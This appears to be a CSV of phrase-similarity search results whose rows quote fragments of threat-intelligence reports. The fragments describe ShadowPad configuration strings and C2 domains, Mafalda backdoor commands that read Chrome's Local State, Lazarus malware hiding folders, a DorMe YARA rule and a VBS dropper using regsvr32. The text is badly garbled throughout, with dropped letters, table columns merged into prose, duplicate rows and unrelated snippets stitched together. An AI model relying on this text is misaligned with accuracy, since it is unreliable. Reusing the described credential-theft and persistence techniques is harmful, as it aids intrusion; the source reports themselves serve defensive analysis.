hash,phrase,similarity,adjacent_sentences
c89a6cfa1e6eb16768ede2ce52695f89,encrypted header,0.7733324702282083,"['purposes, and perhaps for this reason, the one year registrationwasnotrenewed by theatacker.', 'Despite BYTE SIZE (BYTES) DESCRIPTION* POSITION this, anumberof victims aroundtheworld continued 0 4 LURK protocol identifier.', 'to usethedomainto locatetheirC2 server, resulting Hexadecimalbytes 0x4C 0x50x52 in atempted comunications to a C2 server that no 0x4B (orLURKinASCI representation).', 'longerexists.', '4 1 Hexadecimalbyte0x30(0)inal observedsamples.Bytemayform THEVICTIMS partoftheprotocol identifier.', 'Computers using IP adreses alocated to France, 5 4 SizecCompresedmesagesizein bytes (includingheader).', 'thePeoplesRepublicof China, Portugal, SouthKorea, 9 4 Decompresed datasizeinbytes.', 'Taiwan, the United Kingdom and the United States 13 2 ZLIB6streamheader.Hexadecimal areamong thosethat atempted to comunicatewith bytes 0x780x9c7inalobserved alyac.org subdomains after the atackers comunications,denoting thathe DEFLATEcompresionmethod was registrationlapsedinSeptember201.', 'used tocompresthedata(witha window sizeof32K).', 'While some of these computers belong to 15 [Sizec15] DEFLATEcompresed data.', 'security researchers who deliberately instaled *AL VALUES ARE LITLENDIAN UNLES OTHERWISE STATED.']"
8b1ec3103590201632c0768238d50bea,has been obfuscated with the same rel_jmp and fake-jb techniques,0.7750647704535484,"['After decryption, the file is deleted and the shelcode is re-encrypted, saved in the registry, and run.', 'When log.exe is launched subsequently, the shelcode wil be loaded from the registry.', 'The data is stored in a hive with a name resembling the folowing: (HKLM|HKCU)\\Software\\Clases\\CLSID\\{%8.8x-%4.4x-%4.4x- %8.8x%8.8x}, in key %8.8X.', 'The values inserted in the formating strings are generated based on the TimeDateStamp in the PE header of log.dl, and therefore are always identical for any given library copy.', 'In our case, they equal {56a36bd2-5e2b-20b0-96f2cb9b3f43475} and EB5D182, respectively.', 'The payload is ShadowPad shelcode that has ben obfuscated with the same rel_jmp and fake-jb techniques.', 'The folowing strings are contained in its encrypted configuration: 28/41 6/30/2020 1:25:52 PM c %ProgramData%\\ msdn.exe log.dl log.dl.dat WMNetworkSvc WMNetworkSvc WMNetworkSvc SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Run WMSVC %ProgramFiles%\\Windows Media Player\\wmplayer.exe %windir%\\system32\\svchost.exe %windir%\\system32\\winlogon.exe %windir%\\explorer.exe TCP:/cigy2jft92.kasprsky.info:43 UDP:/cigy2jft92.kasprsky.info:53 SOCKS4 SOCKS4 SOCKS5 SOCKS5 They include the likely data of module asembly (June 6, 2020), name of the service used by the malware to gain persistence on the system (WMNetworkSvc), names of proceses into which shelcode can be injected, and the C2 domain cigy2jft92.kasprsky[.]info.', 'As we wrote earlier, the other domain kasprsky[.', ']info has ben used by atackers as a FunySwitch C2 server.', 'Investigation of subdomains and IP adreses yields another second-level domain, livehost[.', ']live, whose subdomain d89o0gm35t.livehost[.']"
d796dbba3d5ae1f39981b59e9602fd58,RAR and SFX-RAR files,0.8295005384285455,[]
d5f48a36310fa03cda7ebcafbdb2f355,RAR and SFX-RAR files,0.8295005384285455,"['2.', '(Atack Scenario) 2.1.', '(Atack Flowchart) , CHM JSE C2 .', '[ 2-1] 2JSE Genians Security Center 3 Threat Inteligence Report 2.2.', '- (Initial Aces-Phishing) 2023 8 .', '.', ', .', '(C2) .', ', (Top-level domain, TLD) "".cam"" .', 'donotreply@sgibn.cam htps:/hones[.', ']fun/0e650c610b7e1075474575b /download [ 2-1] Genians Security Center 4 Threat Inteligence Report [ 2-2] Genians Security Center 5 Threat Inteligence Report 2.3.']"
fe7fa3f3addedc4b685a4ef87902f984,plus the folder,0.7903943838969361,"['CobInt/COLPANTS Phish & Infrastructure Analysis After inspecting the domain, rietumu[.', ']me, ASERT uncovered the email adres solisariana[@]protonmail[.]com.', 'Pivoting on the email leads to five aditional domains each with a creation date of: 2018-08-01.', '1.', 'compas[.', ']plus 2.', 'eucentalbank[.', ']com 3.', 'europecentalbank[.', ']com 4.', 'inter-kasa[.']"
fe7fa3f3addedc4b685a4ef87902f984,plus the folder,0.7903943838969361,"['CobInt/COLPANTS Phish & Infrastructure Analysis After inspecting the domain, rietumu[.', ']me, ASERT uncovered the email adres solisariana[@]protonmail[.]com.', 'Pivoting on the email leads to five aditional domains each with a creation date of: 2018-08-01.', '1.', 'compas[.', ']plus 2.', 'eucentalbank[.', ']com 3.', 'europecentalbank[.', ']com 4.', 'inter-kasa[.']"
475cc557a403e5a686bf4e9a5b16e3d2,"malicious archive,",0.8246317845184259,"['Services display sensitive content.', 'for your neds.', 'such as Archive.org and Archive.Today aim to preserve al websites, which can Ad the folowing to a robots.txt I am NAME owner of DOMAIN.', 'be an unwelcome feature for those who file on your site.', 'Im oficialy requesting the imediate removal of my site wish to erase their past.', 'Fortunately we (Create a new file if one is not from al archive.org products.', 'stil have some privacy powers which already present.)', 'The User-agent: archive.org_ can be executed to remove undesired bot Disalow: / code present content asociated with the domains User-agent: archive.org_bot in our robots.txt file is not which we own.', 'being honored.', 'It can be sen Disalow: / at: Archive.org Removal Create a file caled verify.txt at the htps:/DOMAIN/robots.txt If your website(s) apear on Archive.', 'rot of your site.']"
9e98257b06b69c47a1e84ff668656b28,the folder C:\Users\Public,0.7570171163279376,"['Below are YARA rules to identify the SiestaGraph malware implant and the DorMe IS backdor.', 'rule Windows_Trojan_DorMe { meta: author = ""Elastic Security"" creation_date = ""202-12-09"" last_modified = ""202-12-15"" os = ""Windows"" arch = ""x86"" category_type = ""Trojan"" family = ""DorMe"" threat_name = ""Windows.Trojan.DorMe"" reference_sample = ""96b26e1dcfb8ea215c2fa508125472c8c767569d09a81ab4c39453e4fe7f"" strings: $seq_aes_crypto = { 8B 6C 24 ?', 'C1 E5 ?', '8B 5C 24 ?', '8D 34 9D ?', '?', '?', '?', '0F B6 04 31 32 4 24 ?', '8 04 29 8D 04 9D ?', '?']"
c4c46eae7d246851b784ff31be2d6600,folder c:\programdata,0.7797396339725909,"['They then receive aditional files from the C2 and perform malicious acts.', 'Figure.', 'Backdor operation proces Other Forms of Data Hiding The Lazarus group either used a system folder as a hiding place or imitated the name of a normal file to hide their malware.', 'The default system folders are where their malware hiding is mainly done.', 'The malware is hiden by either creating a similar folder within the system or by disguising the malware as a normal file within a system file thats hiden by default.', 'C:\\ProgramData\\ C:\\ProgramData\\Microsoft\\ C:\\Windows\\System32\\ 2/9 The C:\\ProgramData folder is a default system folder which is hiden by default.', 'A folder with a name similar to the default folder (MicrosoftPackages) is created inside this folder as a malware hiding place or the malware is disguised as a similar file inside the default folder.', 'Figure.', 'Similar folder created to use as a malware hiding place Figure.', 'Hiding malware by imitating default folder names Artifact Wiping Artifact wiping refers to the task of permanently deleting specific files or the whole file system.', 'Not only does it involve file deletion, but expert tols can also be used to erase al traces of use.']"
ac0df47c7a7c71929ea786a25a27fdd7,decryption,0.8539491256374303,"['This indicates that the Mafalda implant is a maintained, ongoing project.', 'The figures below depict the functions in the older and the newer Mafalda variant that handle the procesing of the diferent backdor comands based on the comand number.', 'Fig 8: Older Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 13 Fig 9: Newer Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 14 1 htps:/atack.mitre.org/software/S073/ The ful unobfuscated list of comands, along with the developers descriptions, are available in the Mafalda section of the Technical Apendix.', 'The folowing functionality is only available in the newer Mafalda variant: Network and system configuration reconaisance.', 'Information theft and implant orchestration.', 'Data decryption.', 'Filesystem operations.', 'The folowing is a sumary of some of the newer Mafalda comands: Comand 60 Reads the content of the file %USERPROFILE%\\ApData\\Local\\Gogle\\Chrome\\User Data\\Local State and sends the file content to the C2 server as part of a packet with a name prefixed with lot\\.', 'The Local State file stores security-relevant data, such as an encryption key that Chrome uses to protect cokies.', 'The environment variable %USERPROFILE% expands to the path to the profile folder of the user in whose context Mafalda runs, such as C:\\Users\\test for the user test.', 'Comand 61 Decrypts atacker-provided data using the DPAPI (Data Protection Aplication Programing Interface) key of the platform where Mafalda runs.']"
ac0df47c7a7c71929ea786a25a27fdd7,decryption,0.8539491256374303,"['This indicates that the Mafalda implant is a maintained, ongoing project.', 'The figures below depict the functions in the older and the newer Mafalda variant that handle the procesing of the diferent backdor comands based on the comand number.', 'Fig 8: Older Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 13 Fig 9: Newer Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 14 1 htps:/atack.mitre.org/software/S073/ The ful unobfuscated list of comands, along with the developers descriptions, are available in the Mafalda section of the Technical Apendix.', 'The folowing functionality is only available in the newer Mafalda variant: Network and system configuration reconaisance.', 'Information theft and implant orchestration.', 'Data decryption.', 'Filesystem operations.', 'The folowing is a sumary of some of the newer Mafalda comands: Comand 60 Reads the content of the file %USERPROFILE%\\ApData\\Local\\Gogle\\Chrome\\User Data\\Local State and sends the file content to the C2 server as part of a packet with a name prefixed with lot\\.', 'The Local State file stores security-relevant data, such as an encryption key that Chrome uses to protect cokies.', 'The environment variable %USERPROFILE% expands to the path to the profile folder of the user in whose context Mafalda runs, such as C:\\Users\\test for the user test.', 'Comand 61 Decrypts atacker-provided data using the DPAPI (Data Protection Aplication Programing Interface) key of the platform where Mafalda runs.']"
41d6e1e379006c93e59f114b3161977e,decryption,0.8016585728073772,"['Payload .VBS file Analysis The folowing screnshot shows a part of the .VBS payload file droped by .RTF file.', 'First line is the encrypted .dl 4th line contains Key to decrypt the .dl.', 'Remaining part is self-explanatory.', 'The instruction c = Crypt(c,k) function decrypts the encrypted dl and returns the decrypted dl.', '(Se the screnshot above) c= encrypted dl.', 'k = decryption key.', 'Folowing function writes byte by byte to the droped.dl file.', 'Finaly, the folowing code executes the regsvr32 comand to run the wmiprvse.dl in silent mode and sets the run key in registry.', 'Payload wmiprvse.dl file Analysis This first level of deobfuscation in wmiprvse.dl takes around 3-4 minutes to finish.', 'Then it alocates memory using VirtualAloc and writes the unpacked code to newly alocated memory before it jumps to the unpacked code as shown in folowing scren shot.', 'This dl has 3 layers of unpacking.']"
